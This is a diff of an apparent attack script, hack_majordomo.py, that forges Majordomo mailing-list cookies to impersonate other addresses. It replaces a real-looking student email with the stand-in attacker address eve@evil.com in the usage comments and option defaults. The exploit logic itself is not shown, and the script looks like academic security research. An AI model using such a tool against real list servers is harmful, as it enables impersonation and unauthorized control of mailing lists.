@@ -8,8 +8,8 @@
 # python hack_majordomo.py -x God@heaven.af.mil
 
 # Generate a cookie using our own e-mail address and received cookie
-# python hack_majordomo.py -e real@user.mail real@user.mail
-# python hack_majordomo.py -e real@user.mail -c <cookie> God@heaven.af.mil
+# python hack_majordomo.py -e eve@evil.com real@user.mail
+# python hack_majordomo.py -e eve@evil.com -c <cookie> God@heaven.af.mil
 
 def truncate(number, bits):
     """Truncate value to a certain number of bits"""
@@ -55,7 +55,7 @@ def main():
                       action="store_true", dest="use_xor", default=False)
     parser.add_option('-e', '--email',
                       help="E-mail address we can access to get cookies",
-                      dest="my_email", default="aram.verstegen@student.ru.nl")
+                      dest="my_email", default="eve@evil.com")
     parser.add_option('-c', '--cookie',
                       help="A cookie received on the address specified with -e",
                       dest="cookie", default=None, type="int")
